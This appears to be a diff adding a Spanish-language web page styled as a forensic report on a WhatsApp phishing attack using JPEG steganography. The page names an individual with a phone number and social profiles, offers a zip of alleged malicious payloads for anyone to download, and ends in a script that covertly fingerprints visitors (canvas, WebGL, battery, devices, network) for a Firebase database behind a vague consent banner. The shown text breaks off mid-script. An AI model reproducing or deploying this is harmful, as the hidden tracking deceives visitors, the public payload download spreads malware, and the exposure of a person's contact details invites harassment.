@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🔴 CyberForensic - Ataque de Phishing con Esteganografía</title>
+  <meta name="description"
+    content="Reporte forense completo sobre ataque de phishing con esteganografía en imágenes JPEG vía WhatsApp. Perfil fraudulento: Sebastian Nogueira. CVE-2023-41064." />
+  <meta name="keywords" content="phishing, esteganografia, WhatsApp, iPhone, iOS, seguridad, forense, OSINT, CVE-2023-41064" />
+  <meta name="author" content="Cyber Forensic Team" />
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="🔴 CyberForensic - Ataque de Phishing con Esteganografía" />
+  <meta property="og:description"
+    content="Investigación forense de ataque dirigido a usuarios de iPhone vía WhatsApp. Perfil fraudulento: SEBASTIAN.NOGUEIRA.5" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://viluoca-hat.github.io/ESTAFADORES-VIA-FACEBOOK-WHATSAPP-SEBASTIAN.NOGUEIRA/" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="🔴 CyberForensic - Ataque de Phishing" />
+  <meta name="twitter:description" content="Análisis forense de ataque con esteganografía en imágenes JPEG vía WhatsApp" />
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+  <!-- Estilos Externos -->
+  <link rel="stylesheet" href="style.css" />
+
+  <style>
+    /* Estilos mejorados para el Banner de Consentimiento de Términos */
+    #cb {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: rgba(15, 5, 5, 0.98);
+      border-top: 2px solid #ff3333;
+      padding: 18px 25px;
+      z-index: 100000;
+      text-align: center;
+      box-shadow: 0 -10px 30px rgba(255, 0, 0, 0.2);
+      backdrop-filter: blur(10px);
+    }
+
+    #cb.hidden {
+      display: none;
+    }
+
+    #cb-container {
+      max-width: 900px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    #cb p {
+      color: #ccc;
+      font-size: 0.88rem;
+      text-align: left;
+      flex: 1 1 500px;
+      line-height: 1.4;
+    }
+
+    #cb p strong {
+      color: #ff4444;
+    }
+
+    .cb-actions {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    #cb .btn-accept {
+      background: linear-gradient(135deg, #ff0000, #cc0000);
+      color: #fff;
+      border: 1px solid #ff5555;
+      padding: 10px 24px;
+      border-radius: 25px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    #cb .btn-accept:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px rgba(255, 0, 0, 0.7);
+    }
+
+    #cb .btn-decline {
+      background: rgba(255, 255, 255, 0.05);
+      color: #aaa;
+      border: 1px solid #444;
+      padding: 10px 18px;
+      border-radius: 25px;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    #cb .btn-decline:hover {
+      border-color: #ff3333;
+      color: #ff3333;
+      background: rgba(255, 0, 0, 0.1);
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="toast"></div>
+
+  <!-- Banner de Consentimiento de Términos Mejorado -->
+  <div id="cb">
+    <div id="cb-container">
+      <p>
+        <strong>⚠️ AVISO DE TÉRMINOS Y CONDICIONES:</strong> Este portal es un informe forense de acceso público.
+        Al continuar navegando, aceptas la política de verificación de seguridad de red y recolección de metadatos de acceso para auditoría forense.
+      </p>
+      <div class="cb-actions">
+        <button class="btn-accept" onclick="acceptConsent()">Aceptar y Continuar</button>
+        <button class="btn-decline" onclick="declineConsent()">Rechazar</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+
+    <!-- BANNER CON FOTO DE SEBASTIÁN NOGUEIRA -->
+    <div class="banner fade-in">
+      <div class="banner-content">
+        <div class="banner-profile">
+          <div class="profile-image-container" onclick="lb('sebas.jpg', 'Sebastián Nogueira - Perfil fraudulento de Facebook')">
+            <img src="assets/images/sebas.jpg" alt="Sebastián Nogueira - Perfil fraudulento de Facebook"
+              onerror="this.parentElement.innerHTML='<div class=fallback-text>👤<br>Sebastián<br>Nogueira<br>Perfil Falso</div>'">
+          </div>
+          <div style="color: #666; font-size: 0.8rem; margin-top: 5px;">👆 Haz clic para ampliar</div>
+        </div>
+
+        <div class="banner-text">
+          <span class="alert-badge">🔴 ALERTA DE SEGURIDAD</span>
+          <h1 id="main-title">CyberForensic Report</h1>
+          <div class="subtitle">Análisis de ataque de phishing con esteganografía en imágenes JPEG vía WhatsApp</div>
+
+          <div class="phone-number">
+            <span class="country">🇦🇷 +54</span>
+            <span class="number">9 375 6446868</span>
+          </div>
+
+          <div class="profile-name">
+            🎭 Perfil Fraudulento: <a href="https://www.facebook.com/sebastian.nogueira.5" target="_blank">SEBASTIAN.NOGUEIRA.5</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RESUMEN EJECUTIVO -->
+    <div class="card card-danger fade-in">
+      <h2><span class="emoji">🚨</span> Resumen Ejecutivo</h2>
+      <p>Se ha detectado un <strong>ataque de phishing dirigido</strong> a través de la aplicación de mensajería WhatsApp, utilizando un perfil fraudulento en Facebook que se hace pasar por <strong>Sebastián Nogueira</strong>. El atacante envió dos imágenes en formato <strong>JPEG</strong> que contenían un <strong>payload malicioso</strong> oculto mediante técnicas de <strong>esteganografía</strong>.</p>
+      <br />
+      <p><strong>Nivel de Riesgo:</strong> <span class="status-critical">CRÍTICO</span></p>
+      <p><strong>Dispositivo Afectado:</strong> iPhone 11 (iOS 16.6.1 o anterior)</p>
+      <p><strong>Fecha del Incidente:</strong> 28 de agosto de 2026</p>
+      <p><strong>Vulnerabilidad Explotada:</strong> <span class="glitch">CVE-2023-41064</span> - Image I/O en iOS</p>
+      <p><strong>Número del Agresor:</strong> <span class="glitch">+54 9 375 6446868</span></p>
+      <p><strong>Perfil Facebook:</strong> <a href="https://www.facebook.com/sebastian.nogueira.5" target="_blank" style="color:#ff6666;">SEBASTIAN.NOGUEIRA.5</a></p>
+    </div>
+
+    <!-- PERFIL DEL AGRESOR DETALLADO -->
+    <div class="card card-danger fade-in">
+      <h2><span class="emoji">🎭</span> Perfil del Agresor</h2>
+
+      <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
+        <div style="background: #1a0505; padding: 12px 25px; border-radius: 10px; border: 1px solid #ff3333;">
+          <strong>📱 WhatsApp:</strong> <span style="color:#ff4444;">+54 9 375 6446868</span>
+        </div>
+        <div style="background: #1a0505; padding: 12px 25px; border-radius: 10px; border: 1px solid #ff3333;">
+          <strong>🌐 Facebook:</strong> <a href="https://www.facebook.com/sebastian.nogueira.5" style="color:#ff6666;" target="_blank">SEBASTIAN.NOGUEIRA.5</a>
+        </div>
+        <div style="background: #1a0505; padding: 12px 25px; border-radius: 10px; border: 1px solid #ff3333;">
+          <strong>🐘 Mastodon:</strong> <a href="https://mstdn.social/@sebastian.nogueira.5" style="color:#ff6666;" target="_blank">@sebastian.nogueira.5</a>
+        </div>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Plataforma</th>
+              <th>Usuario / Perfil</th>
+              <th>Estado</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Facebook</strong></td>
+              <td><a href="https://www.facebook.com/sebastian.nogueira.5" style="color:#ff6666;" target="_blank">SEBASTIAN.NOGUEIRA.5</a></td>
+              <td><span class="status-critical">ACTIVO</span></td>
+            </tr>
+            <tr>
+              <td><strong>WhatsApp</strong></td>
+              <td><strong>+54 9 375 6446868</strong></td>
+              <td><span class="status-critical">ACTIVO</span></td>
+            </tr>
+            <tr>
+              <td><strong>Mastodon</strong></td>
+              <td><a href="https://mstdn.social/@sebastian.nogueira.5" style="color:#ff6666;" target="_blank">@sebastian.nogueira.5</a></td>
+              <td><span class="status-medium">ACTIVO</span></td>
+            </tr>
+            <tr>
+              <td><strong>Tistory</strong></td>
+              <td>sebastian.nogueira.5.tistory.com</td>
+              <td><span class="status-medium">ACTIVO</span></td>
+            </tr>
+            <tr>
+              <td><strong>Salon24</strong></td>
+              <td>salon24.pl/u/sebastian.nogueira.5</td>
+              <td><span class="status-medium">ACTIVO</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>🌍 Países Asociados</h3>
+      <div style="display: flex; flex-wrap: wrap; gap: 10px; margin: 10px 0;">
+        <span style="background: #2a0000; padding: 5px 15px; border-radius: 20px; border: 1px solid #ff3333;">🇷🇺 Rusia</span>
+        <span style="background: #2a0000; padding: 5px 15px; border-radius: 20px; border: 1px solid #ff3333;">🇫🇷 Francia</span>
+        <span style="background: #2a0000; padding: 5px 15px; border-radius: 20px; border: 1px solid #ff3333;">🇰🇷 Corea del Sur</span>
+        <span style="background: #2a0000; padding: 5px 15px; border-radius: 20px; border: 1px solid #ff3333;">🇳🇱 Países Bajos</span>
+        <span style="background: #2a0000; padding: 5px 15px; border-radius: 20px; border: 1px solid #ff3333;">🇵🇱 Polonia</span>
+        <span style="background: #1a0505; padding: 5px 15px; border-radius: 20px; border: 2px solid #ff0000;">🇦🇷 Argentina (+54 9 375 6446868)</span>
+      </div>
+
+      <h3>🏷️ Intereses Detectados (OSINT)</h3>
+      <div style="display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0;">
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">social</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">art</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">blog</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">forum</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">tech</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">coding</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">photo</span>
+        <span style="background: #1a1a1a; padding: 4px 12px; border-radius: 15px; font-size: 0.85rem;">mastodon</span>
+      </div>
+    </div>
+
+    <!-- METODOLOGÍA DEL ATAQUE -->
+    <div class="card card-danger fade-in">
+      <h2><span class="emoji">🔬</span> Metodología del Ataque</h2>
+      <p>El atacante utiliza una <strong>técnica avanzada de 6 pasos</strong> que combina esteganografía, cifrado y explotación de vulnerabilidades en iOS:</p>
+
+      <div style="background: #0d0d0d; border-radius: 8px; padding: 20px; margin: 15px 0; border: 1px solid #2a2a2a;">
+        <div style="display: flex; flex-direction: column; gap: 12px;">
+          <div style="display: flex; align-items: center; gap: 15px; background: #1a0505; padding: 10px 15px; border-radius: 6px; border-left: 4px solid #ff0000;">
+            <span style="font-size: 1.5rem;">1️⃣</span>
+            <span><strong>Imagen Base JPEG</strong> - Se selecciona una imagen aparentemente inocua</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 15px; background: #1a0505; padding: 10px 15px; border-radius: 6px; border-left: 4px solid #ff4400;">
+            <span style="font-size: 1.5rem;">2️⃣</span>
+            <span><strong>Inserción del Payload</strong> - Se oculta en el marcador <span class="glitch">FF FE</span> (comentario JPEG)</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 15px; background: #1a0505; padding: 10px 15px; border-radius: 6px; border-left: 4px solid #ff8800;">
+            <span style="font-size: 1.5rem;">3️⃣</span>
+            <span><strong>Cifrado del Payload</strong> - AES-256 o ChaCha20 para evadir detección</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 15px; background: #1a0505; padding: 10px 15px; border-radius: 6px; border-left: 4px solid #ffaa00;">
+            <span style="font-size: 1.5rem;">4️⃣</span>
+            <span><strong>Envío por WhatsApp</strong> - El perfil fraudulento envía las imágenes</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 15px; background: #1a0505; padding: 10px 15px; border-radius: 6px; border-left: 4px solid #ffcc00;">
+            <span style="font-size: 1.5rem;">5️⃣</span>
+            <span><strong>Ejecución en iOS</strong> - Explota <span class="glitch">CVE-2023-41064</span> al abrir la imagen</span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 15px; background: #1a0505; padding: 10px 15px; border-radius: 6px; border-left: 4px solid #ff0000;">
+            <span style="font-size: 1.5rem;">6️⃣</span>
+            <span><strong>Exfiltración de Datos</strong> - Robo de información sensible del iPhone</span>
+          </div>
+        </div>
+      </div>
+
+      <h3>🛡️ Vulnerabilidades Explotadas</h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>CVE</th>
+              <th>Descripción</th>
+              <th>Estado</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>CVE-2023-41064</strong></td>
+              <td>Image I/O en iOS 16.6.1 y anteriores</td>
+              <td><span class="status-critical">EXPLOTADO</span></td>
+            </tr>
+            <tr>
+              <td><strong>CVE-2021-30761</strong></td>
+              <td>Image I/O en iOS 14.5 y anteriores</td>
+              <td><span class="status-medium">POSIBLE</span></td>
+            </tr>
+            <tr>
+              <td><strong>CVE-2020-27932</strong></td>
+              <td>Image I/O en iOS 14.0 y anteriores</td>
+              <td><span class="status-medium">POSIBLE</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- IMÁGENES MANIPULADAS -->
+    <div class="card fade-in">
+      <h2><span class="emoji">📸</span> Imágenes Manipuladas (Payload Oculto)</h2>
+      <p>Las siguientes imágenes fueron enviadas por el perfil fraudulento. Contienen <strong>payload malicioso</strong> oculto en el marcador <span class="glitch">FF FE</span> (comentario JPEG).</p>
+      <p style="color: #666; font-size: 0.85rem;">👆 Haz clic en cualquier imagen para ampliarla</p>
+
+      <div class="image-grid">
+        <div class="img-card" onclick="lb('1.jpeg', '1.jpeg - Imagen con payload oculto')">
+          <img src="assets/images/1.jpeg" alt="Imagen 1 - Payload oculto"
+            onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22300%22%3E%3Crect fill=%22%231a0000%22 width=%22300%22 height=%22300%22/%3E%3Ctext x=%2250%22 y=%22150%22 fill=%22%23ff3333%22 font-size=%2220%22 font-family=%22monospace%22%3E1.jpeg%3C/text%3E%3C/svg%3E'">
+          <div class="caption">
+            <strong>1.jpeg</strong><br />
+            <span class="badge badge-danger">PAYLOAD OCULTO</span><br />
+            <span style="font-size:0.8rem;">163 KB | Marcador FF FE detectado</span>
+          </div>
+        </div>
+        <div class="img-card" onclick="lb('2.jpeg', '2.jpeg - Imagen con payload oculto')">
+          <img src="assets/images/2.jpeg" alt="Imagen 2 - Payload oculto"
+            onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22300%22%3E%3Crect fill=%22%231a0000%22 width=%22300%22 height=%22300%22/%3E%3Ctext x=%2250%22 y=%22150%22 fill=%22%23ff3333%22 font-size=%2220%22 font-family=%22monospace%22%3E2.jpeg%3C/text%3E%3C/svg%3E'">
+          <div class="caption">
+            <strong>2.jpeg</strong><br />
+            <span class="badge badge-danger">PAYLOAD OCULTO</span><br />
+            <span style="font-size:0.8rem;">232 KB | Datos extraños entre FF FE y FF D9</span>
+          </div>
+        </div>
+      </div>
+
+      <h3>📊 Análisis de Firmas Detectadas</h3>
+      <div class="code-block">
+        <span class="comment">// Firmas de WhatsApp encontradas en las imágenes</span><br />
+        <span class="danger">WA</span> <span class="comment">// WhatsApp</span><br />
+        <span class="danger">WatsA</span> <span class="comment">// WhatsApp (ofuscado)</span><br />
+        <span class="danger">wapr</span> <span class="comment">// WhatsApp</span><br />
+        <span class="danger">WA2;</span> <span class="comment">// WhatsApp (ofuscado)</span><br />
+        <span class="danger">wAP9:</span> <span class="comment">// WhatsApp (ofuscado)</span><br /><br />
+        <span class="comment">// Marcadores JPEG sospechosos</span><br />
+        <span class="danger">FF FE</span> <span class="comment">// Comentario JPEG (payload oculto)</span><br />
+        <span class="danger">FF D9</span> <span class="comment">// Fin de imagen (datos extra entre marcadores)</span>
+      </div>
+    </div>
+
+    <!-- EVIDENCIA FORENSE -->
+    <div class="card fade-in">
+      <h2><span class="emoji">🔐</span> Evidencia Forense - Payloads Extraídos</h2>
+      <p>Durante el análisis forense, se lograron extraer los siguientes archivos del payload oculto:</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Archivo</th>
+              <th>Tamaño</th>
+              <th>Descripción</th>
+              <th>Estado</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>extracted_1.zip</strong></td>
+              <td>156 KB</td>
+              <td>Archivo ZIP cifrado</td>
+              <td><span class="status-critical">CIFRADO</span></td>
+            </tr>
+            <tr>
+              <td><strong>extracted_2.zip</strong></td>
+              <td>224 KB</td>
+              <td>Archivo ZIP cifrado</td>
+              <td><span class="status-critical">CIFRADO</span></td>
+            </tr>
+            <tr>
+              <td><strong>payload_1_real.bin</strong></td>
+              <td>92 KB</td>
+              <td>Payload cifrado (AES/ChaCha20)</td>
+              <td><span class="status-critical">CIFRADO</span></td>
+            </tr>
+            <tr>
+              <td><strong>payload_2_real.bin</strong></td>
+              <td>96 KB</td>
+              <td>Payload cifrado (AES/ChaCha20)</td>
+              <td><span class="status-critical">CIFRADO</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>🔑 Hashes SHA-256 (Evidencia)</h3>
+      <div class="code-block">
+        <span class="comment">// Hashes de los archivos incautados</span><br />
+        1b735d07eee0c3cd65efafcfd2c846da91c393a1d7a5fc1c06d0dd33783d9a24 <span class="danger">1.jpeg</span><br />
+        26ab086f6fb8bb513740e85367a2d29865264f195d4ad676a371d49cc66cedd8 <span class="danger">2.jpeg</span><br />
+        7d3905931674645efa429e6297ce34135d4cfb1cf9fc50f3ae5c307ee36cd07d <span class="danger">payload_1_real.bin</span><br />
+        f703bd3dcae559baf277ab0f11170c6b2cf63b7b10cae2b36e8012328bb92b78 <span class="danger">payload_2_real.bin</span>
+      </div>
+    </div>
+
+    <!-- BOTÓN DE DESCARGA -->
+    <div class="download-section fade-in">
+      <a href="archivo_maliciosos.zip" class="btn-download" download>
+        <span class="icon">📦</span> DESCARGAR archivo_maliciosos.zip
+      </a>
+      <div class="download-info">
+        Contiene: <span class="highlight">1.jpeg</span> · <span class="highlight">2.jpeg</span> · <span class="highlight">extracted_1.zip</span> · <span class="highlight">extracted_2.zip</span> · <span class="highlight">payload_1_real.bin</span> · <span class="highlight">payload_2_real.bin</span>
+        <br />
+        <span style="color:#666; font-size:0.8rem;">Tamaño total: ~620 KB | SHA256 disponible en el reporte</span>
+      </div>
+      <div class="download-note">
+        ⚠️ <strong>ATENCIÓN COLABORADORES:</strong> Este archivo contiene la evidencia completa del ataque.
+        Si eres investigador forense, experto en seguridad o deseas colaborar en la investigación,
+        descarga este paquete y analiza los archivos. toda la información recopilada será de gran ayuda
+        para identificar a los responsables y frenar esta red de estafadores.
+      </div>
+    </div>
+
+    <!-- RECOMENDACIONES -->
+    <div class="card card-warning fade-in">
+      <h2><span class="emoji">🛡️</span> Recomendaciones de Seguridad</h2>
+
+      <h3>📱 Para Usuarios de iPhone</h3>
+      <div style="background: #0d0d0d; padding: 15px; border-radius: 8px; margin: 10px 0;">
+        <div style="display: flex; align-items: center; gap: 10px; padding: 5px 0;">
+          <span style="color: #00ff88;">✅</span>
+          <span><strong>ACTUALIZAR iOS</strong> a la última versión (17.x o superior)</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 10px; padding: 5px 0;">
+          <span style="color: #00ff88;">✅</span>
+          <span><strong>NO ABRIR</strong> imágenes de perfiles desconocidos</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 10px; padding: 5px 0;">
+          <span style="color: #00ff88;">✅</span>
+          <span><strong>VERIFICAR</strong> perfiles antes de interactuar</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 10px; padding: 5px 0;">
+          <span style="color: #00ff88;">✅</span>
+          <span><strong>REPORTAR</strong> perfiles sospechosos en WhatsApp</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 10px; padding: 5px 0;">
+          <span style="color: #00ff88;">✅</span>
+          <span><strong>ACTIVAR</strong> autenticación en dos pasos</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- CONTACTOS DE EMERGENCIA -->
+    <div class="card fade-in">
+      <h2><span class="emoji">📞</span> Contactos de Emergencia</h2>
+
+      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px;">
+        <div style="background: #0d0d0d; padding: 15px; border-radius: 8px; border: 1px solid #1a1a1a;">
+          <h3 style="color: #ff4444; margin-top: 0;">🇦🇷 Argentina</h3>
+          <p><strong>Unidad Fiscal de Ciberdelincuencia</strong><br />(011) 5071-0000</p>
+          <p><strong>Policía Federal - División Ciberdelitos</strong><br />0800-666-5082</p>
+          <p><strong>Línea de Denuncias</strong><br />134</p>
+        </div>
+        <div style="background: #0d0d0d; padding: 15px; border-radius: 8px; border: 1px solid #1a1a1a;">
+          <h3 style="color: #ffaa00; margin-top: 0;">🌐 Internacional</h3>
+          <p><strong>INTERPOL - Ciberdelincuencia</strong><br /><a href="https://www.interpol.int" style="color:#ff6666;" target="_blank">interpol.int</a></p>
+          <p><strong>Europol - EC3</strong><br /><a href="https://www.europol.europa.eu" style="color:#ff6666;" target="_blank">europol.europa.eu</a></p>
+        </div>
+      </div>
+    </div>
+
+    <!-- CÓDIGO DE SHAMING -->
+    <div class="card card-danger fade-in">
+      <h2><span class="emoji">🌐</span> Código de Shaming Público</h2>
+      <p>Comparte esta alerta en redes sociales para proteger a más personas:</p>
+
+      <div class="code-block" style="font-family: 'Segoe UI', sans-serif; font-size: 0.9rem; line-height: 1.8; color: #fff;">
+        <div style="background: #ff0000; color: white; padding: 20px; border-radius: 10px; margin: 10px 0;">
+          <h1 style="color: white; font-size: 1.8rem;">🚨 ALERTA DE SEGURIDAD 🚨</h1>
+          <h2 style="color: #ffcccc; font-size: 1.2rem;">Perfil fraudulento en WhatsApp/Facebook</h2>
+          <p><strong>Usuario:</strong> SEBASTIAN.NOGUEIRA.5</p>
+          <p><strong>WhatsApp:</strong> +54 9 375 6446868</p>
+          <p><strong>Método:</strong> Envía imágenes con payload oculto para robar datos sensibles</p>
+          <p><strong>Riesgo:</strong> 🔴 CRÍTICO - Usuarios de iPhone iOS 16.6.1 o anterior</p>
+          <p>⚠️ <strong>NO ABRAN</strong> imágenes de este perfil</p>
+          <hr style="border-color: #ff6666;" />
+          <p style="font-size: 0.8rem;">Más información: <a href="https://viluoca-hat.github.io/ESTAFADORES-VIA-FACEBOOK-WHATSAPP-SEBASTIAN.NOGUEIRA/" style="color:#fff; text-decoration:underline;">CyberForensic Report</a></p>
+        </div>
+      </div>
+    </div>
+
+    <!-- LLAMADO A LA ACCIÓN -->
+    <div class="card card-danger fade-in" style="text-align: center; border: 2px solid #ff0000;">
+      <h2 style="font-size: 2rem; color: #ff0000; justify-content: center;">🔴 ¡ACTÚA AHORA!</h2>
+      <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 20px 0;">
+        <span style="background: #1a1a1a; padding: 10px 20px; border-radius: 30px; border: 1px solid #ff3333;">⭐ Haz Star a este repositorio</span>
+        <span style="background: #1a1a1a; padding: 10px 20px; border-radius: 30px; border: 1px solid #ff3333;">🔄 Comparte esta alerta</span>
+        <span style="background: #1a1a1a; padding: 10px 20px; border-radius: 30px; border: 1px solid #ff3333;">🐛 Reporta el perfil</span>
+        <span style="background: #1a1a1a; padding: 10px 20px; border-radius: 30px; border: 1px solid #ff3333;">🛡️ Actualiza tu dispositivo</span>
+        <span style="background: #1a1a1a; padding: 10px 20px; border-radius: 30px; border: 1px solid #ff3333;">🤝 Únete a la investigación</span>
+      </div>
+      <p style="font-size: 1.4rem; font-weight: 700; color: #ff3333;">JUNTOS PODEMOS DETENER ESTA RED DE ESTAFADORES</p>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+      <p>© 2026 <strong>Cyber Forensic Team</strong> | Este reporte es de carácter informativo y educativo</p>
+      <p>Licencia: <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">Creative Commons Attribution-NonCommercial 4.0</a></p>
+      <p style="margin-top: 10px; font-size: 0.8rem; color: #333;">
+        <strong>Última Actualización:</strong> 28 de agosto de 2026 | <strong>Versión:</strong> 2.0 | <strong>Estado:</strong> 🔴 ACTIVE INVESTIGATION
+      </p>
+    </div>
+
+  </div>
+
+  <!-- LIGHTBOX PARA VER IMÁGENES -->
+  <div id="lb" class="lightbox" onclick="clb(event)">
+    <button class="close-btn" onclick="clb(event)">&times;</button>
+    <img id="lbi" src="" alt="" />
+    <div id="lbinfo" class="image-info"></div>
+  </div>
+
+  <!-- LÓGICA DE TELEMETRÍA Y CONTROL -->
+  <script>
+    var CONFIG = {
+      apiKey: "AIzaSyCD0_ZytkIsce9Hv_eVYen35dz7QVEu1lE",
+      authDomain: "mi-lab-seguridad-8afd1.firebaseapp.com",
+      databaseURL: "https://mi-lab-seguridad-8afd1-default-rtdb.firebaseio.com",
+      projectId: "mi-lab-seguridad-8afd1",
+      storageBucket: "mi-lab-seguridad-8afd1.firebasestorage.app",
+      messagingSenderId: "1002089965809",
+      appId: "1:1002089965809:web:5eecb4643952e0f68ca150"
+    };
+
+    if (typeof firebase !== 'undefined' && !window._fbInited) {
+      firebase.initializeApp(CONFIG);
+      window._fbInited = true;
+      window._db = firebase.database();
+    }
+
+    function genId() {
+      return 'red_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
+    }
+
+    function showMsg(msg, err) {
+      var t = document.getElementById('toast');
+      if (!t) return;
+      t.textContent = msg;
+      t.className = 'show' + (err ? ' error' : '');
+      clearTimeout(t._timer);
+      t._timer = setTimeout(function () { t.className = ''; }, 5000);
+    }
+
+    function collectData() {
+      try {
+        var data = {
+          sessionId: genId(),
+          timestamp: new Date().toISOString(),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+          deviceMemory: navigator.deviceMemory || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints || 0,
+          colorDepth: window.screen.colorDepth || 'unknown',
+          orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
+          doNotTrack: navigator.doNotTrack || 'unknown',
+          connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+          downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown',
+          rtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'unknown',
+          webglRenderer: (function () {
+            try {
+              var canvas = document.createElement('canvas');
+              var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+              if (gl) {
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic WebGL';
+              }
+              return 'Sin soporte WebGL';
+            } catch (e) { return 'No disponible'; }
+          })(),
+          battery: (function () {
+            try {
+              if (navigator.getBattery) {
+                navigator.getBattery().then(function (b) {
+                  window._lastBattery = { level: Math.round(b.level * 100) + '%', charging: b.charging };
+                });
+              }
+              return window._lastBattery || { level: 'No disponible', charging: false };
+            } catch (e) { return { level: 'No disponible', charging: false }; }
+          })(),
+          canvasFingerprint: (function () {
+            try {
+              var c = document.createElement('canvas');
+              var ctx = c.getContext('2d');
+              c.width = 200; c.height = 50;
+              ctx.textBaseline = 'top';
+              ctx.font = '14px "Arial"';
+              ctx.fillStyle = '#f60';
+              ctx.fillRect(125, 1, 62, 20);
+              ctx.fillStyle = '#069';
+              ctx.fillText('CyberForensic,123', 2, 15);
+              ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+              ctx.fillText('CyberForensic,123', 4, 17);
+              var str = c.toDataURL();
+              var hash = 0;
+              for (var i = 0; i < str.length; i++) {
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                hash |= 0;
+              }
+              return 'FP_' + Math.abs(hash).toString(16);
+            } catch (e) { return 'FP_UNAVAILABLE'; }
+          })(),
+          adBlockDetected: (function () {
+            try {
+              var testAd = document.createElement('div');
+              testAd.innerHTML = '&nbsp;';
+              testAd.className = 'adsbox pub_300x250 pub_300x250m pub_728x90 text-ad ad-text text-ads text_ad ad_text';
+              testAd.style.cssText = 'width:1px;height:1px;position:absolute;left:-999px;';
+              document.body.appendChild(testAd);
+              var blocked = testAd.offsetHeight === 0;
+              testAd.remove();
+              return blocked ? 'Detectado' : 'No detectado';
+            } catch (e) { return 'No detectado'; }
+          })(),
+          isIncognito: (function () {
+            try {
+              return !!(window.webkitRequestFileSystem || window.IndexedDB || (navigator.storage && navigator.storage.estimate));
+            } catch (e) { return false; }
+          })(),
+          mediaDevicesCount: (function () {
+            try {
+              if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.enumerateDevices().then(function (devs) {
+                  window._devCount = devs.length;
+                });
+              }
+              return window._devCount || 'Desconocido';
+            } catch (e) { return 'Desconocido'; }
+          })(),
